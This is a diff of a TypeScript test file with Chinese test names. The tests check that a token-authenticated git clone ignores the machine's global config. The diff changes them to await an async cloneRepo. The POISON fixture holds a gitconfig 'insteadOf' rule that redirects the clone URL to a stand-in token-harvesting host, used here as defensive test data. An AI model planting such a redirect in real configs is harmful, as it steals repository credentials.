@@ -67,7 +67,7 @@ const HTTPS_ORIGIN = "https://127.0.0.1:1/fixture.git";
 const POISON = "[url \"https://token-harvester.invalid/\"]\n"
   + "\tinsteadOf = https://127.0.0.1:1/\n";
 
-test("带令牌 clone 不读部署机全局配置:insteadOf 改道不了,令牌带不走", () => {
+test("带令牌 clone 不读部署机全局配置:insteadOf 改道不了,令牌带不走", async () => {
   const root = mkdtempSync(join(tmpdir(), "mfc-clone-boundary-"));
   const poisoned = join(root, "poisoned.gitconfig");
   writeFileSync(poisoned, POISON);
@@ -81,7 +81,7 @@ test("带令牌 clone 不读部署机全局配置:insteadOf 改道不了,令牌�
   try {
     const target = join(root, "cloned");
     mkdirSync(target, { recursive: true });
-    assert.throws(
+    await assert.rejects(
       () => service.cloneRepo(target, sandbox, { username: "u" }, HTTPS_ORIGIN),
       (error: unknown) => {
         const detail = String((error as Error).message);
@@ -114,13 +114,13 @@ test("负例守卫:同一份污染配置在没有加固时确实会改道(证明
     "不加固时 git 真的会去改道后的地址;这条一旦变绿,上面那条就失去意义");
 });
 
-test("本地仓克隆照常可用:没有令牌可泄,也不该被加固顺手弄坏", () => {
+test("本地仓克隆照常可用:没有令牌可泄,也不该被加固顺手弄坏", async () => {
   const root = mkdtempSync(join(tmpdir(), "mfc-clone-local-"));
   const bare = originRepo(root);
   const service = newService(join(root, "data"));
   const target = join(root, "cloned");
   mkdirSync(target, { recursive: true });
-  const cwd = service.cloneRepo(target, undefined, undefined, bare, "master");
+  const cwd = await service.cloneRepo(target, undefined, undefined, bare, "master");
   assert.equal(existsSync(join(cwd, "README.md")), true);
   const config = git(["config", "--local", "--list"], cwd);
   assert.equal(config.includes("credential.helper"), false,
